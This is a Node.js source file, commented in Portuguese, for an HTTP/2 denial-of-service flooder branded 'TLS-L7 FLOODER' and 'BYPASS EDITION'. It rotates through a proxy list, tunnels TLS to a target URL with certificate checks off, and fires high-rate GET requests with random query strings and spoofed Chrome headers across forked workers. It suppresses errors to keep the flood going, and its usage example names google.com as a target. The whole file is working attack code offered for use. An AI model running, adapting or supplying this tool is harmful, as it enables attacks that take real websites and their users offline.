const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const url = require("url");
const colors = require('colors');

// Ignora erros para manter o flood constante
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// Configuração de Argumentos
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

if (process.argv.length < 7) {
    console.log(`
    ${'⚠️  USO INCORRETO'.red.bold}
    ${'Sintaxe:'.white} node ${process.argv[1].split('/').pop()} <url> <tempo> <rate> <threads> <proxies.txt>
    ${'Exemplo:'.white} node l7.js https://google.com 60 10 4 proxy.txt
    `.yellow);
    process.exit();
}

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/).filter(l => l.length > 5);

// Lógica do Master (Painel de Controle)
if (cluster.isMaster) {
    let totalSent = 0;
    let rps = 0;
    const codes = {};

    for (let i = 0; i < args.threads; i++) {
        const worker = cluster.fork();
        worker.on('message', (msg) => {
            if (msg.type === 'stat') {
                totalSent += msg.count;
                rps += msg.count;
                if (msg.code) codes[msg.code] = (codes[msg.code] || 0) + msg.count;
            }
        });
    }

    const updateUI = setInterval(() => {
        console.clear();
        console.log('──────────────────────────────────────────────────'.cyan);
        console.log('   🔥 TLS-L7 FLOODER | MODO: CONDIÇÃO VERMELHA 🔥   '.bold.red);
        console.log('   @gringomdz | BYPASS EDITION v2.0              '.grey);
        console.log('──────────────────────────────────────────────────'.cyan);
        console.log(`${' Target  :'.white} ${args.target.yellow}`);
        console.log(`${' Threads :'.white} ${args.threads.toString().magenta} | ${'Rate :'.white} ${args.Rate.toString().magenta}`);
        console.log('──────────────────────────────────────────────────'.grey);
        console.log(`${' RPS CURRENT :'.white} ${rps.toLocaleString().green.bold}`);
        console.log(`${' TOTAL SENT  :'.white} ${totalSent.toLocaleString().cyan}`);
        
        let statusStr = Object.entries(codes).map(([c, v]) => `${c}: ${v}`).join(' | ');
        console.log(`${' STATUS      :'.white} ${statusStr || 'Aguardando Handshake...'}`.yellow);
        console.log('──────────────────────────────────────────────────'.grey);
        rps = 0;
    }, 1000);

    setTimeout(() => {
        clearInterval(updateUI);
        console.log(`\n${'[!]'.red} Teste de estresse finalizado com sucesso.`);
        process.exit(0);
    }, args.time * 1000);

} else {
    // Lógica do Worker (Ataque)
    setInterval(() => {
        const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
        if (!proxyAddr) return;
        const [proxyHost, proxyPort] = proxyAddr.split(':');
        
        const socket = net.connect({ host: proxyHost, port: ~~proxyPort });
        socket.setKeepAlive(true, 15000);
        socket.setNoDelay(true);

        socket.once('connect', () => {
            socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
        });

        socket.once('data', (data) => {
            if (!data.toString().includes("200 Connection established")) return socket.destroy();

            const tlsConn = tls.connect({
                socket: socket,
                servername: parsedTarget.host,
                ALPNProtocols: ['h2'],
                rejectUnauthorized: false,
                ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384",
                minVersion: "TLSv1.2",
                maxVersion: "TLSv1.3"
            }, () => {
                const client = http2.connect(parsedTarget.href, {
                    protocol: "https:",
                    createConnection: () => tlsConn,
                    settings: { 
                        headerTableSize: 65536,
                        maxConcurrentStreams: 2000,
                        initialWindowSize: 6291456,
                        enablePush: false 
                    }
                });

                client.on('connect', () => {
                    const attackInterval = setInterval(() => {
                        if (!client || client.destroyed || tlsConn.destroyed) return clearInterval(attackInterval);
                        
                        for (let i = 0; i < args.Rate; i++) {
                            const req = client.request({
                                ":method": "GET",
                                ":path": parsedTarget.path + "?" + crypto.randomInt(1, 9999999),
                                ":scheme": "https",
                                ":authority": parsedTarget.host,
                                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8",
                                "accept-encoding": "gzip, deflate, br",
                                "cache-control": "no-cache",
                                "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24"',
                                "sec-ch-ua-mobile": "?0",
                                "sec-ch-ua-platform": '"Windows"',
                                "sec-fetch-dest": "document",
                                "sec-fetch-mode": "navigate",
                                "sec-fetch-site": "none",
                                "upgrade-insecure-requests": "1"
                            });

                            req.on('response', (res) => {
                                process.send({ type: 'stat', count: 1, code: res[':status'] });
                                req.close();
                                req.destroy();
                            });
                            req.end();
                        }
                    }, 1000);
                });

                client.on('error', () => {
                    client.destroy();
                    socket.destroy();
                });
            });

            tlsConn.on('error', () => socket.destroy());
        });

        socket.on('error', () => socket.destroy());
    }, 300); // Delay entre novas conexões de socket para evitar sobrecarga local
}
